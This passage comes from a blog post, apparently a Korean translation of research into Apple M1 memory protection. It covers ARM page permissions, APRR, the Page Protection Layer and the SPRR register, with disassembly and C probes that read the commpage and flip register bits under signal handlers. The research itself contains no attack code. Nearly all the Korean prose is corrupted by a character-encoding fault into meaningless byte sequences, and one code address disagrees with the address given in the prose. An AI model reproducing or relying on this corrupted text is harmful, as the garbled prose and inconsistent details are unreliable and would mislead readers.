ìš”ì•…í•œë‹¤. ì´ë¯¸ ì•Œê³  ìˆëŠ” ë‚´ìš©ì´ë¼ë©´ ë„˜ì–´ê°€ë„ ì¢‹ë‹¤.</p><p>ìœ„ì˜ ë‚´ìš©ì„ ë‹¤ë£¨ê³  ë‚˜ì„œ SPRRê³¼ GXFê°€ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë‹¤ë£¬ë‹¤. SPRRê³¼ GXFê°€ ë¬´ì—‡ì¸ì§€ë§Œ ì•Œê³  ì‹¶ìœ¼ë©´ Asahi Linux ìœ„í‚¤ë¥¼ ì°¸ê³ í•˜ë©´ ëœë‹¤.</p><h2 id="MMUs-pagetables-and-kernels"><a href="#MMUs-pagetables-and-kernels" class="headerlink" title="MMUs, pagetables, and kernels"></a>MMUs, pagetables, and kernels</h2><p>ARM CPUëŠ” x86ì˜ ringê³¼ ê°™ì€ <a href="https://developer.arm.com/documentation/102412/0100/Privilege-and-Exception-levels">exception levels</a>ì—ì„œ ì‹¤í–‰ëœë‹¤. EL0ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹¤í–‰ë˜ëŠ” userspaceì´ë©° EL1ì€ ì»¤ë„ì´ ì‹¤í–‰ë˜ê³  EL2ëŠ” í•˜ì´í¼ë°”ì´ì €ê°€ ì‹¤í–‰ëœë‹¤. (íŒì›¨ì–´ë¥¼ ìœ„í•œ EL3ëŠ” M1 ì¹©ì—ëŠ” ì—†ë‹¤.)</p><p><a href="https://developer.arm.com/documentation/102142/latest/Virtualization-Host-Extensions">Virtualization Host Extensions</a>ì´ ìˆëŠ” ARM64 CPUëŠ” EL2ë¥¼ EL1ì²˜ëŸ¼ ë§Œë“¤ì–´ ì»¤ë„ì„ ì‰½ê²Œ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.</p><p>ì»¤ë„ì˜ ì‘ì—… ì¤‘ í•˜ë‚˜ëŠ” ìœ ì € ëœë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” ê° ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì¢…ì†ë˜ì–´ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì£¼ì†Œ ê³µê°„ì„ ì•Œë¦¬ëŠ” ê²ƒì´ë‹¤. ì´ëŠ” Memory Management Unitì´ ìˆ˜í–‰í•œë‹¤. MMUëŠ” ê°€ìƒ ì£¼ì†Œë¥¼ í†µí•´ ì‹¤ì œ ë¬¼ë¦¬ ì£¼ì†Œë¥¼ ê´€ë¦¬í•  ìˆ˜ ìˆë‹¤. ì´ ë§¤í•‘ì˜ ê°€ì¥ ì‘ì€ ë‹¨ìœ„ë¥¼ 4 KiB í¬ê¸°ì˜ í˜ì´ì§€ë¼ í•˜ë©° í˜ì´ì§€ì—ëŠ” ê°€ì¥ ì£¼ì†Œì™€ ì‹¤ì œ ì£¼ì†Œê°€ ìˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì´ë‚˜ ì»¤ë„ì´ <code>x</code> ìœ„ì¹˜ì˜ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ë ¤ í•˜ë©´ MMUëŠ” í˜ì´ì§€ í…Œì´ë¸”ì—ì„œ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ê³  <code>y</code> ì£¼ì†Œì—ì„œ ë©”ëª¨ë¦¬ë¥¼ ë°˜í™˜í•œë‹¤. ì»¤ë„ì€ ìœ ì € ëœë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ê° í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•´ ë‹¤ë¥¸ í˜ì´ì§€ í…Œì´ë¸” ì„¸íŠ¸ë¥¼ ìƒì„±í•˜ì—¬ ë³„ë„ì˜ ì£¼ì†Œ ê³µê°„ì„ ì œê³µí•œë‹¤.</p><p>ì´ ë§¤í•‘ ì™¸ì—ë„ ê° í˜ì´ì§€ëŠ” íŠ¹ì • ì•¡ì„¸ìŠ¤ í”Œë˜ê·¸ë¥¼ ì¸ì½”ë”©í•˜ëŠ” 4 ë¹„íŠ¸ê°€ ì¡´ì¬í•œë‹¤. ì´ í”Œë˜ê·¸ëŠ” í˜ì´ì§€ì˜ ì½ê¸° ì“°ê¸° ê¶Œí•œì´ë‚˜ ìœ ì € ëœë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ í˜¹ì€ ì»¤ë„ì´ í˜ì´ì§€ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ”ì§€ë¥¼ ê²°ì •í•œë‹¤. ARMv8-A CPUì˜ ê° í˜ì´ì§€ í…Œì´ë¸” í•­ëª©ì—ì„œ 4 ë¹„íŠ¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><ul><li><em>UXN</em>, Unprivileged Execute never: ì´ í˜ì´ì§€ì—ì„œ ìœ ì € ëœë“œ (EL0) ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŒ</li><li><em>PXN</em>, Prvileged excute never: ì´ í˜ì´ì§€ì—ì„œ ì»¤ë„ (EL1) ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŒ</li><li><em>AP0</em> and <em>AP1</em>:  ì»¤ë„ê³¼ ìœ ì € ëœë“œì— <code>rw/--</code>, <code>rw/rw</code>, <code>r-/--</code>, <code>r-/r-</code>  ì½ê¸°, ì“°ê¸° ì ‘ê·¼ ê¶Œí•œì„ ì¸ì½”ë”©</li></ul><p>ë§ˆì§€ë§‰ ì•¡ì„¸ìŠ¤ í”Œë˜ê·¸ë¥¼ ê²°ì •í•˜ëŠ”ë° ì¶”ê°€ì ì¸ ë³µì¡í•¨(PAN, ê³„ì¸µ ì œì–´)ì´ ìˆì§€ë§Œ ì´ ê²Œì‹œê¸€ì—ì„œëŠ” ë‹¤ë£¨ì§€ ì•ŠëŠ”ë‹¤. ìœ ì € ëœë“œì™€ ì»¤ë„ì˜ ê¶Œí•œì´ ì—°ê´€ì´ ìˆë‹¤ëŠ” ì ì„ ì£¼ì˜í•´ì•¼ í•œë‹¤. ìœ ì €ëœë“œëŠ” <code>rw</code>ì´ì§€ë§Œ ì»¤ë„ì—ëŠ” <code>r-</code>ë¡œ í˜ì´ì§€ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•˜ë‹¤.</p><h2 id="APRR"><a href="#APRR" class="headerlink" title="APRR"></a>APRR</h2><p>ê° í˜ì´ì§€ì—ëŠ” EL0/1(ìœ ì €/ì»¤ë„ ëª¨ë“œ)ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œ(ì½ê¸°/ì“°ê¸°/ì‹¤í–‰)ì„ ì œì–´í•˜ëŠ” 4ê°œì˜ í”Œë˜ê·¸ê°€ ìˆë‹¤. APRRì€ í˜ì´ì§€ í…Œì´ë¸” ì—”íŠ¸ë¦¬ì— 4ê°œì˜ í”Œë˜ê·¸ë¥¼ ì €ì¥í•˜ëŠ” ê²ƒ ëŒ€ì‹ ì— ë³„ë„ì˜ í…Œì´ë¸”ì— ëŒ€í•œ ì¸ë±ìŠ¤ë¡œ ë³€ê²½í•œë‹¤.(ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ì§ì ‘ ì¸ì½”ë”©í•˜ëŠ” ëŒ€ì‹  4ë¹„íŠ¸ index [AP1][AP0]PXN][UXN]ìœ¼ë¡œ ë³‘í•©ëœë‹¤.) ì´ ë³„ë„ì˜ í…Œì´ë¸”ì€ í˜ì´ì§€ì˜ ì‹¤ì œ ê¶Œí•œì„ ì¸ì½”ë”©í•œë‹¤. ê²Œë‹¤ê°€ ì¼ë¶€ ë ˆì§€ìŠ¤í„°ëŠ” userspaceì˜ ì´ëŸ¬í•œ ê¶Œí•œì„ ì¶”ê°€ë¡œ ì œí•œí•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ë ˆì§€ìŠ¤í„°ë“¤ì€ ì»¤ë„ê³¼ ìœ ì € ëœë“œì—ì„œ ë¶„ë¦¬ë˜ì–´ ìˆê³  í˜ì´ì§€ ê¶Œí•œì„ ë§Œë“¤ ë•Œ ìœ ì—°ì„±ì„ ì œê³µí•œë‹¤.</p><p>ë³´í†µ ëª¨ë“  ê°œë³„ ì—”íŠ¸ë¦¬ë¥¼ ìˆ˜ì •í•˜ë ¤ë©´ ë§ì€ page walkê°€ í•„ìš”í•˜ì§€ë§Œ, APRRì€ ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡œ í˜ì´ì§€ í…Œì´ë¸” ê¶Œí•œì— ëŒ€í•œ ê°„ì ‘ì ì¸ ê³„ì¸µì„ ë„ì…í•˜ì—¬ ë‹¨ì¼ ë ˆì§€ìŠ¤í„° ì“°ê¸°ë¡œ ë§ì€ í˜ì´ì§€ ê¶Œí•œì„ íš¨ìœ¨ì ìœ¼ë¡œ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤.</p><p>ë” ìì„¸í•œ ì‚¬í•­ì€ <a href="https://siguza.github.io/APRR/">siguzaì˜ write-up</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><h2 id="Just-In-Time-ì»´íŒŒì¼ëŸ¬"><a href="#Just-In-Time-ì»´íŒŒì¼ëŸ¬" class="headerlink" title="Just-In-Time ì»´íŒŒì¼ëŸ¬"></a>Just-In-Time ì»´íŒŒì¼ëŸ¬</h2><p>ë³´í†µ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ê³ ìˆ˜ì¤€ ì–¸ì–´ì—ì„œ ê¸°ê³„ ì½”ë“œë¡œ ì»´íŒŒì¼ëœ í›„ ë°°í¬ëœë‹¤. ì½”ë“œëŠ” ëŸ°íƒ€ì„ ì¤‘ì— ìˆ˜ì •ë˜ì§€ ì•Šì•„ <code>r-x</code>ë¡œ ë§¤í•‘í•  ìˆ˜ ìˆë‹¤.</p><p>í•˜ì§€ë§Œ JIT ì»´íŒŒì¼ëŸ¬ëŠ” ë™ì ìœ¼ë¡œ ê¸°ê³„ ì½”ë“œë¥¼ ìƒì„±í•˜ë¯€ë¡œ ì´ë¥¼ ìœ„í•´ ìƒˆ ì½”ë“œë¥¼ ì‘ì„±í•œ í›„ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ ë©”ëª¨ë¦¬ ì˜ì—­ì„ <code>rwx</code>ë¡œ ë§¤í•‘í•´ì•¼ í•œë‹¤.</p><p>ì• í”Œì€ ì•„ì´í°ì—ì„œ CPUê°€ ë³´ì¦ëœ ëª…ë ¹ë§Œ ì‹¤í–‰í•˜ê¸¸ ì›í–ˆìœ¼ë¯€ë¡œ ì´ëŸ° ë§¤í•‘ì„ ì›í•˜ì§€ ì•Šì•˜ë‹¤. ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì´ <code>rxw</code> ë§¤í•‘ì„ ìš”ì²­í•˜ë©´ í•´ë‹¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì›í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì „ì²´ì ì¸ ë³´í˜¸ ë™ì‘ì´ ë¬´ì˜ë¯¸í•´ì§„ë‹¤. ì¼ë¶€ ì• í”Œë¦¬ì¼€ì´ì…˜ë§Œ ì´ëŸ¬í•œ ë§¤í•‘ ê¶Œí•œì´ ìˆì–´ë„ <code>rxw</code> ë§¤í•‘ì— shellcodeë¥¼ ì‘ì„±í•˜ì—¬ ì•…ìš©ì˜ ëŒ€ìƒì´ ë  ìˆ˜ ìˆë‹¤.(<code>rxw</code> ì˜ì—­ì„ ì°¾ì•„ arbitrary write í›„ jump gadgetì„ ì°¾ëŠ” ê²ƒì€ ì–´ë µê² ì§€ë§Œ)</p><p>í•˜ì§€ë§Œ ìë°”ìŠ¤í¬ë¦½íŠ¸ê°€ ìˆìœ¼ë¯€ë¡œ ì• í”Œì€ JIT ì»´íŒŒì¼ëŸ¬ê°€ í•„ìš”í•˜ë‹¤.</p><p>ì´ ë¬¸ì œëŠ” APRRë¡œ í•´ê²°í•  ìˆ˜ ìˆë‹¤. íŠ¹ì • ìœ ì € ëœë“œ ì• í”Œë¦¬ì¼€ì´ì…˜(iOSì˜ ì‚¬íŒŒë¦¬, macOSì˜ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜)ì€ <code>rw-</code>ì™€ <code>r-x</code>ë¥¼ ë¹ ë¥´ê²Œ ì „í™˜í•  ìˆ˜ ìˆëŠ” íŠ¹ìˆ˜ ë©”ëª¨ë¦¬ ì˜ì—­(<code>[MAP_JIT</code> í”Œë˜ê·¸ë¥¼ í†µí•œ <code>mmap</code>, <code>pthread_jit_write_protect_np</code>](<a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))%EC%9D%84">https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))ì„</a> ìš”ì²­í•  ìˆ˜ ìˆë‹¤. ì—¬ê¸°ì„œ APRR ë ˆì§€ìŠ¤í„° ë‚´ë¶€ì˜ 2 ë¹„íŠ¸ë¥¼ ìˆ˜ì •í•˜ì—¬ JIT í˜ì´ì§€ì— <code>w</code> ëŒ€ì‹  <code>x</code>ë¥¼ ì œê±°í•˜ì—¬ ëª¨ë“  í˜ì´ì§€ë¥¼ <code>rw-</code>ì—ì„œ <code>r-x</code>ë¡œ ìˆ˜ì •í•œë‹¤.(í˜¹ì€ ê·¸ ë°˜ëŒ€ë¡œ ë™ì‘)</p><h2 id="í˜ì´ì§€-ë³´í˜¸-ê³„ì¸µ-Page-Protection-Layer"><a href="#í˜ì´ì§€-ë³´í˜¸-ê³„ì¸µ-Page-Protection-Layer" class="headerlink" title="í˜ì´ì§€ ë³´í˜¸ ê³„ì¸µ(Page Protection Layer)"></a>í˜ì´ì§€ ë³´í˜¸ ê³„ì¸µ(Page Protection Layer)</h2><p>ì• í”Œì€ ê°€ëŠ¥í•œ í•œ ëª¨ë“  ì‹¤í–‰ ê°€ëŠ¥í•œ í˜ì´ì§€ì— code signingì„ ìš”êµ¬í•œë‹¤. iOSì—ì„œëŠ” ì• í”Œì—ì„œ ì´ ì„œëª…ì„ ê°€ì ¸ì™€ì•¼ í•˜ê³  macOSì—ì„œëŠ” ë¡œì»¬ë¡œ ìƒì„±í•  ìˆ˜ ìˆëŠ” ad-hoc(ì„ì‹œ) ì„œëª…ì´ ìˆë‹¤. Code signingì€ ë³´í†µ ì»¤ë„ì— ì˜í•´ ì‹œí–‰ëœë‹¤. ì»¤ë„ì€ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ê°™ì€ ì½”ë“œë¥¼ ë§ì´ ê°€ì§€ê³  ìˆìœ¼ë¯€ë¡œ attack surfaceê°€ êµ‰ì¥íˆ í¬ë‹¤. ëª¨ë“  ë“œë¼ì´ë²„ì˜ ëª¨ë“  ë²„ê·¸ëŠ” code signingì„ ìš°íšŒí•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ì´ìŠˆëŠ” ì˜¤ë˜ì „ ë¹„ë””ì˜¤ ê²Œì„ ì½˜ì†” <a href="https://free60project.github.io/wiki/Hypervisor/">ë§ˆì´í¬ë¡œì†Œí”„íŠ¸ Xbox 360 í•˜ì´í¼ë°”ì´ì €</a>ì—ì„œ í•´ê²°ë˜ì—ˆë‹¤. ëª¨ë“  ì»¤ë„ ì½”ë“œì— exploitable í•œ ë²„ê·¸ê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ëŒ€ì‹ ì— í•˜ì´í¼ë°”ì´ì € ìì²´ì— ë²„ê·¸ê°€ ìˆëŠ”ì§€ë§Œ í™•ì¸í•˜ë©´ ëœë‹¤.</p><p>ë¹„ìŠ·í•˜ê²Œ ì• í”Œì€ ì»¤ë„ ë‚´ë¶€ì— ë§¤ìš° ë‚®ì€ ì˜¤ë²„í—¤ë“œë¥¼ ê°€ì§„ í•˜ì´í¼ë°”ì´ì €ë¥¼ ìƒì„±í•˜ê¸° ìœ„í•´ APRRì„ ì‚¬ìš©í•œë‹¤. ì²« ë²ˆì§¸ë¡œ í˜ì´ì§€ í…Œì´ë¸”(ì¤‘ìš”í•œ ë°ì´í„° êµ¬ì¡°ë¥¼ ê°€ì§„ ë©”ëª¨ë¦¬)ê³¼ ê¶Œí•œ ì½”ë“œ ì„¹ì…˜ PPLì„ ì»¤ë„ ìì²´ì— ì½ê¸° ì „ìš©ìœ¼ë¡œ ë§¤í•‘í•œë‹¤. <a href="https://ko.wikipedia.org/wiki/%ED%8A%B8%EB%9E%A8%ED%8E%84%EB%A6%B0_(%EC%BB%B4%ED%93%A8%ED%8C%85)">trampoline</a> í•¨ìˆ˜ëŠ” APRRì„ ì‚¬ìš©í•˜ì—¬ í˜ì´ì§€ í…Œì´ë¸”ì„ <code>rw-</code>ë¡œ ë‹¤ì‹œ ë§¤í•‘í•˜ê³  PPL ì½”ë“œë¥¼ <code>r-x</code>ë¡œ ë§¤í•‘í•œ í›„ ì í”„í•œë‹¤. ì´ trampoline í•¨ìˆ˜ëŠ” PPL ì½”ë“œì˜ ìœ ì¼í•œ ì—”íŠ¸ë¦¬ í¬ì¸íŠ¸ì´ë¯€ë¡œ hypercall ëª…ë ¹ì–´ì²˜ëŸ¼ ë™ì‘í•˜ë©° PPL ìì²´ëŠ” ì˜¤ë²„ í—¤ë“œê°€ ë§¤ìš° ë‚®ì€ í•˜ì´í¼ë°”ì´ì €ì²˜ëŸ¼ ë™ì‘í•œë‹¤.</p><p>ìƒì„¸í•œ ë‚´ìš©ì€ <a href="http://newosxbook.com/articles/CasaDePPL.html">Jonathanì˜ Casa De P(a)P(e)L write up</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><h1 id="SPRR"><a href="#SPRR" class="headerlink" title="SPRR"></a>SPRR</h1><h2 id="Userland-JIT"><a href="#Userland-JIT" class="headerlink" title="Userland JIT"></a>Userland JIT</h2><p>ì• í”Œ ì‹¤ë¦¬ì½˜ì˜ JITì€ <code>rw-</code>ì™€ <code>r-x</code> ê¶Œí•œì„ ë¹ ë¥´ê²Œ ì „í™˜í•˜ê¸° ìœ„í•´ íŠ¹ìˆ˜í•œ ì˜ì—­ì„ í• ë‹¹ë°›ëŠ”ë‹¤. ì´ì „ SoCì—ì„œ APRRì„ ì‚¬ìš©í•˜ì—¬ ì‹œí–‰ë˜ì—ˆë‹¤.</p><p><a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon">Just-in-Time ì»´íŒŒì¼ëŸ¬ì— ëŒ€í•œ ì• í”Œì˜ ê³µì‹ ë¬¸ì„œ</a>ì—ì„œ M1ì—ì„œ ì´ëŸ¬í•œ ì „í™˜ì€ ì—¬ì „íˆ <code>_pthread_jit_write_protect_np</code> í•¨ìˆ˜ê°€ ìˆ˜í–‰í•¨ì„ ì•Œ ìˆ˜ ìˆë‹¤. <code>otool -xv /usr/lib/system/libsystem_pthread.dylib</code>ì„ í†µí•´ ì–´ë– í•œ ë™ì‘ì„ í•˜ëŠ”ì§€ í™•ì¸í•´ë³´ì.</p><pre><code class="hljs apache"><span class="hljs-attribute">_pthread_jit_write_protect_np</span>:[...]<span class="hljs-attribute">0000000000007fdc</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xc<span class="hljs-number">118</span><span class="hljs-attribute">0000000000007fe0</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xffff, lsl #<span class="hljs-number">16</span><span class="hljs-attribute">0000000000007fe4</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xf, lsl #<span class="hljs-number">32</span><span class="hljs-attribute">0000000000007fe8</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>, lsl #<span class="hljs-number">48</span><span class="hljs-attribute">0000000000007fec</span>        ldr     x<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]                ; Latency: 4</span><span class="hljs-meta">0000000000007ff0        msr     S3_6_C15_C1_5, x0</span><span class="hljs-meta">0000000000007ff4        isb</span><span class="hljs-meta">[...]</span></code></pre><p>ì£¼ì†Œ <code>0xffffc118</code>ì—ì„œ 64ë¹„íŠ¸ ì •ìˆ˜ë¥¼ ë¡œë“œí•œ í›„ <code>s3_6_c15_c1_5</code> ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ì— ì‘ì„±í•œë‹¤. <code>0xffffc110</code>ì—ì„œ ìƒˆë¡œìš´ ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„° ê°’ì„ ë¡œë“œí•˜ëŠ” ë¹„ìŠ·í•œ ì½”ë“œê°€ ë” ìˆë‹¤. ì´ ì£¼ì†Œë“¤ì€ ëª¨ë“  ìœ ì € ëœë“œ í”„ë¡œì„¸ìŠ¤ì— ë§¤í•‘ë˜ê³  ì»¤ë„ì´ ìœ ì € ëœë“œì— ì „ë‹¬í•˜ëŠ” ë§ì€ ë³€ìˆ˜ë¥¼ í¬í•¨í•œ commpage ì˜ì—­ì´ë‹¤.</p><p>ì˜¤í”ˆ ì†ŒìŠ¤ XNU ì½”ë“œì—ëŠ” commpage ë‚´ë¶€ì— ì´ ë³€ìˆ˜ë“¤ì„ ì„¤ì •í•˜ëŠ” ì½”ë“œê°€ ì—†ì§€ë§Œ ì´ì „ ì„¸ëŒ€ APRRì— ì‚¬ìš©ëœ <code>cp_aprr_shadow_jit_rw</code>ì— ëŒ€í•œ ì°¸ì¡° ì½”ë“œê°€ ë‚¨ì•„ìˆë‹¤.</p><p>ì´ C í”„ë¡œê·¸ë¨ì„ ë¤í”„ í•´ë³´ì</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">uint64_t</span> *sprr = (<span class="hljs-keyword">uint64_t</span> *)<span class="hljs-number">0xfffffc110</span>;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx %llx\n&quot;</span>, sprr[<span class="hljs-number">0</span>], sprr[<span class="hljs-number">1</span>]);&#125;</code></pre><p><code>0x2010000030300000</code>ê³¼ <code>0x2010000030100000</code> ê°’ì„ í†µí•´ JIT í˜ì´ì§€ì˜ <code>r-x</code>ì™€ <code>rw-</code> ê¶Œí•œì„ ì „í™˜í•œë‹¤. ì´ëŠ” APRRê³¼ ìœ ì‚¬í•˜ì§€ë§Œ ë‹¤ë¥¸ ë ˆì§€ìŠ¤í„°ë¥¼ ì‚¬ìš©í•˜ë©° ë‹¤ë¥¸ magic numberë¥¼ í¬í•¨í•œë‹¤.</p><p>SPRRì— ëŒ€í•œ ëŒ€ëµì ì¸ ì•„ì´ë””ì–´ë¥¼ í†µí•´ ì»¤ë„ì„ disassemble í•˜ê³  ì´ ë ˆì§€ìŠ¤í„°ë‚˜ ê·¼ì²˜ ë ˆì§€ìŠ¤í„°ë¥¼ ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><p>ìš°ë¦¬ê°€ ì°¾ì€ ë ˆì§€ìŠ¤í„°ì—ì„œ ë¹„íŠ¸ë¥¼ ìˆ˜ì •í•˜ê³  ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ í™•ì¸í•˜ì. M1ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì¼ë°˜ ìœ ì € ëœë“œ í”„ë¡œê·¸ë¨ì—ì„œë„ ê°€ëŠ¥í•˜ë‹¤.</p><p>ëª¨ë“  ë¹„íŠ¸ë¥¼ 0ê³¼ 1ë¡œ ì„¤ì •</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);&#125;<span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; ++i) &#123;        write_sprr(<span class="hljs-number">1U</span>LL&lt;&lt;i);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bit %02d: %016llx\n&quot;</span>, i, read_sprr());    &#125;</code></pre><p>commpageì—ì„œ ì°¾ì€ ë‘ ê°’ì´ ë‹¤ë¥¸ ë‘ ë¹„íŠ¸ë¥¼ ì œì™¸í•œ ëª¨ë“  ë¹„íŠ¸ê°€ initial valueë¡œ ì ê²¼ë‹¤. ì´ë¥¼ í†µí•´ JIT í˜ì´ì§€ ê¶Œí•œê³¼ ê´€ë ¨ì´ ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤. <code>mmap</code>ì„ ì‚¬ìš©í•˜ì—¬ í˜ì´ì§€ë¥¼ ë§¤í•‘í•  ìˆ˜ ìˆë‹¤. ì½ê¸°ë‚˜ ì“°ê¸°ê°€ ë³´í˜¸ëœ í˜ì´ì§€ë¥¼ ì½ê±°ë‚˜ ì“°ë©´ <code>SIGBUS</code>ê°€ ë°œìƒí•˜ê³  ì‹¤í–‰ ê¶Œí•œì´ ì—†ëŠ” í˜ì´ì§€ë¡œ ì í”„í•˜ë©´ <code>SIGSEV</code>ê°€ ë°œìƒí•œë‹¤. signal handlerë¥¼ í†µí•´ ìœ ì € ëœë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì´ëŸ¬í•œ signalì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>ë³´í˜¸ëœ í˜ì´ì§€ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ <code>x0</code>ì„ magic constantë¡œ ì„¤ì •í•œ signal handlerë¥¼ ì„¤ì •í•˜ê³  return ë˜ê¸° ì „ì— í”„ë¡œê·¸ë¨ ì¹´ìš´í„°ë¥¼ ì¦ê°€ì‹œí‚¨ë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;&#125;</code></pre><p>ì‹¤í–‰ ê¶Œí•œì´ ì—†ëŠ” í˜ì´ì§€ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒë„ ë¹„ìŠ·í•œ ë°©ë²•ìœ¼ë¡œ í•˜ë©´ ëœë‹¤. í”„ë¡œê·¸ë¨ ì¹´ìš´í„°ë¥¼ ë§í¬ ë ˆì§€ìŠ¤í„°ë¡œ ì„¤ì •í•˜ê³  calleeë¡œ ëŒì•„ê°€ magic valueë¥¼ <code>x0</code>ì— ì €ì¥í•œë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;&#125;</code></pre><p>ì´ì œ <code>MAP_JIT</code>ìœ¼ë¡œ í˜ì´ì§€ë¥¼ 